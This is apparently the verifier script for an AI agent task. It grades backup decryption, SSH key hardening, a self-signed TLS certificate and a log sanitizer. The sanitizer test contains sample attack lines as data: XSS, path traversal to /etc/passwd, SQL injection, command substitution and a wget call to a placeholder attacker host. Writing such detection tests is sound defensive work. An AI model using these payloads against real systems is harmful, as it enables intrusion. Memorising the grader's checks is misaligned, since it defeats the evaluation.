#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import datetime
import gzip
import os
import re
import secrets
import subprocess
import tarfile
import tempfile

import pytest


def run(command, **kwargs):
    return subprocess.run(command, capture_output=True, **kwargs)


def test_decrypted_backup():
    backup_path = "/home/user/backup.tar.gz"
    encrypted_path = "/home/user/backup.enc"
    image_path = "/app/passphrase.png"
    assert os.path.isfile(backup_path), f"Decrypted backup not found at {backup_path}"
    assert os.path.isfile(encrypted_path), f"Encrypted backup not found at {encrypted_path}"
    assert os.path.isfile(image_path), f"Passphrase image not found at {image_path}"

    # Keep the original gzip validity assertion.
    try:
        with gzip.open(backup_path, "rb") as f:
            f.read(1)
    except Exception as e:
        pytest.fail(f"File {backup_path} is not a valid gzip file: {e}")

    # Independently OCR the supplied image and decrypt the encrypted source.
    ocr = run(["tesseract", image_path, "stdout", "--psm", "7"], text=True)
    assert ocr.returncode == 0, f"OCR failed: {ocr.stderr}"
    password = ocr.stdout.rstrip()
    assert password, "OCR returned an empty backup password"

    with tempfile.TemporaryDirectory() as td:
        expected_path = os.path.join(td, "expected.tar.gz")
        decrypted = run(
            ["openssl", "enc", "-d", "-aes-256-cbc", "-pbkdf2",
             "-pass", "stdin", "-in", encrypted_path, "-out", expected_path],
            input=(password + "\n").encode(),
        )
        assert decrypted.returncode == 0, f"Reference decryption failed: {decrypted.stderr.decode(errors='replace')}"

        with open(expected_path, "rb") as f:
            expected = f.read()
        with open(backup_path, "rb") as f:
            actual = f.read()
        assert actual == expected, "backup.tar.gz is not the decryption of backup.enc"

    # Confirm the archive is genuinely the supplied backup, not merely arbitrary gzip data.
    with tarfile.open(backup_path, "r:gz") as archive:
        names = {member.name.rstrip("/") for member in archive.getmembers()}
        assert names == {"backup_contents", "backup_contents/data.txt"}, "Unexpected backup archive contents"
        member = archive.extractfile("backup_contents/data.txt")
        assert member is not None
        assert member.read() == b"important backup data\n"


def test_ssh_hardening():
    priv_key_path = "/home/user/.ssh/id_ed25519"
    pub_key_path = "/home/user/.ssh/id_ed25519.pub"
    config_path = "/home/user/.ssh/config"

    assert os.path.isfile(priv_key_path), f"SSH private key not found at {priv_key_path}"
    assert os.path.isfile(pub_key_path), f"SSH public key not found at {pub_key_path}"
    assert os.path.isfile(config_path), f"SSH config not found at {config_path}"

    with open(config_path, "r") as f:
        config_content = f.read()

    # Keep the original assertions.
    assert "PasswordAuthentication no" in config_content, "SSH config does not disable PasswordAuthentication"
    assert "IdentityFile " in config_content and "id_ed25519" in config_content, "SSH config does not specify the new IdentityFile"

    # Validate that the private key is an unencrypted ED25519 key.
    derived = run(["ssh-keygen", "-y", "-P", "", "-f", priv_key_path], text=True, timeout=10)
    assert derived.returncode == 0, f"Private key is invalid or passphrase-protected: {derived.stderr}"
    derived_fields = derived.stdout.strip().split()
    assert len(derived_fields) >= 2 and derived_fields[0] == "ssh-ed25519", "Private key is not ED25519"

    with open(pub_key_path, "r") as f:
        public_fields = f.read().strip().split()
    assert len(public_fields) >= 2 and public_fields[0] == "ssh-ed25519", "Public key is not ED25519"
    assert public_fields[:2] == derived_fields[:2], "SSH public key does not match the private key"

    # Parse the Host * section rather than accepting unrelated substrings/comments.
    blocks = []
    current = None
    for raw in config_content.splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        parts = line.split(None, 1)
        keyword = parts[0].lower()
        value = parts[1].strip() if len(parts) == 2 else ""
        if keyword == "host":
            current = {"patterns": value.split(), "directives": []}
            blocks.append(current)
        elif keyword == "match":
            current = None
        elif current is not None:
            current["directives"].append((keyword, value))

    star_blocks = [b for b in blocks if "*" in b["patterns"]]
    assert star_blocks, "SSH config has no Host * section"
    assert any(
        any(k == "passwordauthentication" and v.lower() == "no" for k, v in b["directives"])
        and any(k == "identityfile" and "id_ed25519" in v for k, v in b["directives"])
        for b in star_blocks
    ), "Host * does not disable password authentication and select the new key"

    # Have OpenSSH evaluate the configuration for a fresh hostname.
    hostname = "verify-" + secrets.token_hex(8) + ".invalid"
    effective = run(["runuser", "-u", "user", "--", "ssh", "-G", "-F", config_path, hostname], text=True, timeout=10)
    assert effective.returncode == 0, f"OpenSSH rejected the client config: {effective.stderr}"
    settings = {}
    for line in effective.stdout.splitlines():
        fields = line.split(None, 1)
        if len(fields) == 2:
            settings.setdefault(fields[0].lower(), []).append(fields[1].strip())
    assert settings.get("passwordauthentication", [""])[0].lower() == "no"
    assert any(value.endswith("/.ssh/id_ed25519") for value in settings.get("identityfile", [])), "Effective config does not select id_ed25519"


def test_tls_certificate():
    cert_path = "/home/user/server.crt"
    key_path = "/home/user/server.key"

    assert os.path.isfile(cert_path), f"TLS certificate not found at {cert_path}"
    assert os.path.isfile(key_path), f"TLS private key not found at {key_path}"

    # Keep the original CN assertion.
    result = run(["openssl", "x509", "-noout", "-subject", "-in", cert_path], text=True)
    assert result.returncode == 0, f"Failed to read certificate: {result.stderr}"
    assert "CN = internal.corp" in result.stdout or "CN=internal.corp" in result.stdout, "Certificate Common Name is not 'internal.corp'"

    with open(key_path, "rb") as f:
        key_bytes = f.read()
    assert b"ENCRYPTED" not in key_bytes, "TLS private key is encrypted"

    key_check = run(["openssl", "rsa", "-in", key_path, "-check", "-noout"], text=True, timeout=10)
    assert key_check.returncode == 0, f"TLS key is not a valid unencrypted RSA key: {key_check.stderr}"
    key_text = run(["openssl", "pkey", "-in", key_path, "-text", "-noout"], text=True, timeout=10)
    assert key_text.returncode == 0
    assert re.search(r"(?:Private-Key|RSA Private-Key): \(2048 bit", key_text.stdout), "TLS RSA key is not 2048 bits"

    cert_text = run(["openssl", "x509", "-in", cert_path, "-noout", "-text"], text=True)
    assert cert_text.returncode == 0, f"Invalid TLS certificate: {cert_text.stderr}"
    assert "Public Key Algorithm: rsaEncryption" in cert_text.stdout
    assert "Public-Key: (2048 bit)" in cert_text.stdout

    # Compare canonical public keys from the certificate and private key.
    key_pub = run(["openssl", "pkey", "-in", key_path, "-pubout", "-outform", "DER"])
    cert_pem_pub = run(["openssl", "x509", "-in", cert_path, "-pubkey", "-noout"])
    assert key_pub.returncode == 0 and cert_pem_pub.returncode == 0
    cert_pub = run(["openssl", "pkey", "-pubin", "-outform", "DER"], input=cert_pem_pub.stdout)
    assert cert_pub.returncode == 0
    assert key_pub.stdout == cert_pub.stdout, "TLS certificate does not match server.key"

    subject = run(["openssl", "x509", "-in", cert_path, "-noout", "-subject", "-nameopt", "RFC2253"], text=True)
    issuer = run(["openssl", "x509", "-in", cert_path, "-noout", "-issuer", "-nameopt", "RFC2253"], text=True)
    assert subject.returncode == 0 and issuer.returncode == 0
    subject_dn = subject.stdout.strip().split("=", 1)[1]
    issuer_dn = issuer.stdout.strip().split("=", 1)[1]
    assert subject_dn == issuer_dn, "TLS certificate is not self-issued"

    verified = run(["openssl", "verify", "-CAfile", cert_path, cert_path], text=True)
    assert verified.returncode == 0, f"TLS certificate is not validly self-signed: {verified.stderr}"

    dates = run(["openssl", "x509", "-in", cert_path, "-noout", "-startdate", "-enddate"], text=True)
    assert dates.returncode == 0
    values = dict(line.split("=", 1) for line in dates.stdout.splitlines() if "=" in line)
    fmt = "%b %d %H:%M:%S %Y %Z"
    not_before = datetime.datetime.strptime(values["notBefore"], fmt).replace(tzinfo=datetime.timezone.utc)
    not_after = datetime.datetime.strptime(values["notAfter"], fmt).replace(tzinfo=datetime.timezone.utc)
    assert not_after - not_before == datetime.timedelta(days=365), "TLS certificate is not valid for exactly 365 days"
    now = datetime.datetime.now(datetime.timezone.utc)
    assert not_before <= now <= not_after, "TLS certificate is not currently valid"


def test_log_sanitization_script():
    script_path = "/home/user/filter_logs.sh"
    assert os.path.isfile(script_path), f"Log sanitization script not found at {script_path}"
    assert os.access(script_path, os.X_OK), f"Script {script_path} is not executable"

    clean_dir = "/app/corpus/clean/"
    evil_dir = "/app/corpus/evil/"
    clean_failed = []
    evil_failed = []

    # Keep the original corpus assertions.
    if os.path.isdir(clean_dir):
        for filename in os.listdir(clean_dir):
            filepath = os.path.join(clean_dir, filename)
            if not os.path.isfile(filepath):
                continue
            with open(filepath, "r") as f:
                expected_output = f.read()
            result = run(["bash", script_path, filepath], text=True)
            if result.stdout != expected_output:
                clean_failed.append(filename)

    if os.path.isdir(evil_dir):
        for filename in os.listdir(evil_dir):
            filepath = os.path.join(evil_dir, filename)
            if not os.path.isfile(filepath):
                continue
            result = run(["bash", script_path, filepath], text=True)
            if result.stdout.strip() != "":
                evil_failed.append(filename)

    error_msg = []
    if evil_failed:
        error_msg.append(f"{len(evil_failed)} evil files bypassed: {', '.join(evil_failed)}")
    if clean_failed:
        error_msg.append(f"{len(clean_failed)} clean files modified: {', '.join(clean_failed)}")
    if error_msg:
        pytest.fail(" | ".join(error_msg))

    # Exercise every required signature, case handling, mixed input, arbitrary
    # paths/content, direct execution, and exact argument handling.
    token = secrets.token_hex(20)
    clean_lines = [
        f"{token} GET /ordinary/script-name HTTP/1.1 200\n",
        f"{token} text javascript without-colon and dots.. are benign\n",
        f"{token} command=wget_without_required_space HTTP/1.1\n",
    ]
    evil_lines = [
        f"{token} GET /?q=<ScRiPt>alert(1)</sCrIpT> HTTP/1.1\n",
        f"{token} GET /?next=JaVaScRiPt:alert(1) HTTP/1.1\n",
        f"{token} GET /../../secret HTTP/1.1\n",
        f"{token} GET /?..%2Fetc/passwd HTTP/1.1\n",
        f"{token} GET /?q=uNiOn SeLeCt password HTTP/1.1\n",
        f"{token} GET /?id=1=1 HTTP/1.1\n",
        f"{token} GET /?cmd=$(id) HTTP/1.1\n",
        f"{token} GET /?cmd=`id` HTTP/1.1\n",
        f"{token} GET /?cmd=wget http://attacker.invalid/x HTTP/1.1\n",
    ]
    mixed = [evil_lines[0], clean_lines[0], evil_lines[1], evil_lines[2], clean_lines[1],
             evil_lines[3], evil_lines[4], evil_lines[5], clean_lines[2],
             evil_lines[6], evil_lines[7], evil_lines[8]]

    with tempfile.TemporaryDirectory(prefix="log verifier ") as td:
        path = os.path.join(td, secrets.token_hex(8) + " input.log")
        with open(path, "w") as f:
            f.writelines(mixed)

        result = run([script_path, path], text=True, timeout=10)
        assert result.returncode == 0, f"Sanitizer failed on valid input: {result.stderr}"
        assert result.stderr == "", "Sanitizer emitted diagnostics for valid input"
        assert result.stdout == "".join(clean_lines), "Sanitizer did not generically preserve only benign lines"

        no_arg = run([script_path], text=True, timeout=10)
        two_args = run([script_path, path, path], text=True, timeout=10)
        assert no_arg.returncode != 0, "Sanitizer accepted zero arguments"
        assert two_args.returncode != 0, "Sanitizer accepted more than one argument"
        assert no_arg.stdout == "" and two_args.stdout == "", "Invalid invocation emitted log output"
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
